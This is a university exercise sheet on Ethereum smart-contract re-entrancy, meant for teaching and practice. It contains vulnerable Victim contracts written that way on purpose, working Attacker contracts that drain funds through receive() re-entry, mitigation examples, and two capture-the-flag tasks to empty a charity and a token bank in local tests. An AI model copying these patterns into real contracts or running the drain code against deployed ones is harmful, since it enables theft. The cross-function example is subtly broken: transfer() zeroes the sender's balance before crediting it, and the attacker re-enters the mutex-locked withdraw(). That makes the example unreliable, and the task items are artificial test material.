# Smart Contracts Exercise 05: Re-Entrancy

## Introduction

Re-entrancy is one of the most damaging vulnerabilities in Ethereum's history. This well-documented type of attack gained notoriety in 2016 with the infamous [DAO hack](https://en.wikipedia.org/wiki/The_DAO). Re-entrancy occurs when an attacker calls a vulnerable contract before the previous call completes, leading to unexpected states or unauthorized fund transfers. In this exercise, you will learn how to identify and exploit various types of re-entrancy attacks, as well as implement proper mitigation strategies.

### Project Setup

You have two options for working with this exercise. Using docker container or local installation. Choose the one that best fits your preferences.

### Using Docker with VS Code

This option uses Docker to create a development environment with all the necessary tools and dependencies pre-installed.

**Prerequisites:**

- **[Docker](https://www.docker.com/products/docker-desktop)** - A platform for developing, shipping, and running applications in containers.
- **[Visual Studio Code](https://code.visualstudio.com/)** - A lightweight but powerful source code editor.
- **[Dev Containers](https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers)** - An extension to VS Code that lets you use a Docker container as a full-featured development environment.

**Setting Up the Project:**

1. Visit the following [GitLab repository](https://gitlab.fel.cvut.cz/radovluk/smart-contracts-exercises/-/tree/main/05-Re-Entrancy/task/task-code) and clone it to your local machine.
2. Open the repository folder in VS Code.
3. When prompted, click "Reopen in Container" or use the command palette (F1) and run `Dev Containers: Reopen in Container`.

### Local Setup

If you prefer working directly on your machine without Docker, you can set up the development environment locally.

**Prerequisites**
- **Node.js** - https://nodejs.org/en/ - An open-source, cross-platform, back-end JavaScript runtime environment that runs on the V8 engine and executes JavaScript code outside a web browser.
- **NPM**: Node Package Manager, which comes with Node.js.

Open your terminal and run the following commands to verify the installations:

```bash
$ node -v
$ npm -v
```

Both commands should return the installed version numbers of Node.js and NPM respectively. Node.js provides the runtime environment required to execute JavaScript-based tools like Hardhat, while NPM is used to manage the packages and dependencies needed for development.

**Setting Up the Project**

1. Visit the following [GitLab repository](https://gitlab.fel.cvut.cz/radovluk/smart-contracts-exercises/-/tree/main/05-Re-Entrancy/task/task-code) and clone it to your local machine.
2. Open a terminal and navigate to the project directory.
3. Install the project dependencies by running `npm install`.

## Re-Entrancy Attacks

A re-entrancy attack is a technique where an external call is used to re-enter the same function or another function in a way that disrupts the expected flow or state changes. Despite being well-known, this vulnerability remains prevalent. For more information, refer to this [Historical Collection of Re-entrancy Attacks](https://github.com/pcaversaccio/reentrancy-attacks?tab=readme-ov-file). There are several types of re-entrancy attacks, including single-function re-entrancy, cross-function re-entrancy, cross-contract re-entrancy, cross-chain re-entrancy, and read-only re-entrancy. The basic prerequisite for a re-entrancy attack is that the vulnerable contract makes an external call and allows the attacker to exploit the not-yet-updated state of the vulnerable contract during this call.

### Single-Function Re-Entrancy

This is the simplest example of re-entrancy that you might encounter. Study the code and try to understand how it works. Then replicate this attack in the [prepared file in REMIX IDE](https://remix.ethereum.org/?#activate=solidity&url=https://github.com/radovluk/unbreakable-vault/contracts/reentrancy01.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.28+commit.7893614a.js).

**Single-Function Re-Entrancy Attack Flow:**

**Step 1:** Attacker.attack()  
**Step 2:** Victim.deposit()  
  - balances[attacker] += msg.value  
**Step 3:** Attacker.attack() calls Victim.withdraw()  
**Step 4:** Victim.withdraw() execution:  
  - 1. Read balance (amount)  
  - 2. Send funds via call(msg.sender, amount)  
**Step 5:** Funds arrive at Attacker  
  - triggers receive() function  
**Step 6:** Attacker.receive() checks:  
  - if (victim.balance > initialDeposit) then call Victim.withdraw()  
**Step 7:** Re-entrancy Loop: drain funds  
**Step 8:** In the last withdraw() call  
  - balances[attacker] is finally set 0  

```solidity
// Single-Function Re-Entrancy Vulnerable Contract
contract Victim {
    mapping(address => uint) private balances;

    function withdraw() public {
        uint amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}
```

```solidity
// Single-Function Re-Entrancy Attacker Contract
contract Attacker {
    Victim victim;
    uint256 private initialDeposit;

    constructor(address _vulnerable) {
        victim = Victim(_vulnerable);
    }

    function attack() public payable {
        initialDeposit = msg.value;
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance > initialDeposit) {
            victim.withdraw();
        }
    }
}
```

### Re-Entrancy Mitigations

#### Checks-Effects-Interactions Pattern

It is recommended to follow CEI pattern in your contracts. CEI stands for:

1. **Check** conditions
2. **Effects** update internal state
3. **Interactions** perform external calls

```solidity
function withdraw() public {
    // 1. Checks
    uint amount = balances[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    // 2. Effects
    balances[msg.sender] = 0;

    // 3. Interactions
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Transfer failed");
}
```

By setting the balance to zero before sending Ether, you prevent the attacker from withdrawing more than once during the same call flow.

#### Mutex / Re-Entrancy Locks

A simple boolean flag, commonly known as a "`locked`" flag or a "`mutex`," can prevent re-entrancy if checked properly:

```solidity
bool private locked = false;

modifier noReentrant() {
    require(!locked, "No re-entrancy");
    locked = true;
    _;
    locked = false;
}

function withdraw() public noReentrant {
    uint amount = balances[msg.sender];
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    balances[msg.sender] = 0;
    require(success, "Transfer failed");
}
```

Note: the example above still remains vulnerable to cross-function re-entrancy attacks.

### Cross-Function/Cross-Contract Re-Entrancy

**Cross-function/Cross-contract re-entrancy** involves two (or more) functions (contracts) that can be called in a sequence leading to undesired behavior. Even if we mitigate the single-function re-entrancy with a simple mutex, we can still be vulnerable to this type of re-entrancy in more complex scenarios.

```solidity
// Cross-Function Re-Entrancy Example
contract Victim {
    mapping(address => uint) private balances;
    bool locked;

    modifier noReentrant() {
        require(!locked, "ReentrancyGuardError");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() public noReentrant {
        uint amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

    function transfer(address to) public {
        balances[msg.sender] = 0;
        balances[to] += balances[msg.sender];
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

contract Attacker {
    Victim victim;
    uint256 private initialDeposit;

    constructor(address _vulnerable) {
        victim = Victim(_vulnerable);
    }

    function attack() public payable {
        initialDeposit = msg.value;
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance > initialDeposit) {
            victim.withdraw();
        }
    }
}
```

Play around with this code example in [prepared file in REMIX IDE](https://remix.ethereum.org/?#activate=solidity&url=https://github.com/radovluk/unbreakable-vault/contracts/reentrancy02.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.28+commit.7893614a.js).

### Read-Only Re-Entrancy

Read-only re-entrancy is a particular case of cross-contract re-entrancy attacks. This vulnerability occurs when a smart contract's behavior depends on the state of another contract. While attackers usually target state-changing functions, view functions can also provide outdated state information during a cross-contract re-entrancy. This scenario can lead to the exploitation of third-party infrastructure.

## Task

### Task 1: Cat Charity Hijinks

The *Cat Charity* was supposed to fund the most adorable meow-a-thon in history. Generous donors (like the deployer) have already chipped in a hefty 10 ETH. You (the player), on the other hand, starts with a modest 1 ETH and a gleam in their eye. After the owner unexpectedly cancels the campaign, refunds are open—*wide open*, as it turns out.

**Your Mission:**
- Empty the charity's balance, snatching the full 10 ETH for yourself.
- End up with more than 10 ETH, turning your purr-less pockets into a chonky Ether stash.

Code your solution in the `test/CatCharity.js` file. Use only the player account. Verify your solution by running the following command:

```bash
$ npm run catcharity
```

Files that are relevant for this challenge: `test/CatCharity.js`, `contracts/CatCharity.sol`

### Task 2: CTU Token Bank

The *CTU Token Bank* is a decentralized vault where users can stash their Ether, withdraw it, buy CTU Tokens with it, and sell those tokens back for Ether. This bank works hand-in-hand with the ERC-20 CTUToken contract to handle token transactions and employs a ReentrancyGuard to fend off re-entrancy attacks on crucial functions. CTU Tokens are a hot commodity, sold at a fixed rate of 1 Token per 1 ETH. Initially, the bank holds 10 ETH from anonymous clients. You start with 5.1 ETH and no CTU Tokens, while the bank owns all the CTU Tokens. You can only buy CTU Tokens if you have deposited funds in the bank.

**Your Mission:**
- Drain the bank's balance to zero.
- End up with more than 15 ETH.

Code your solution in the `test/CTUTokenBank.js` file. Use only the player account. Verify your solution by running the following command:

```bash
$ npm run tokenbank
```

Files that are relevant for this challenge: `test/CTUTokenBank.js`, `contracts/CTUToken.sol`, `contracts/CTUTokenBank.sol`
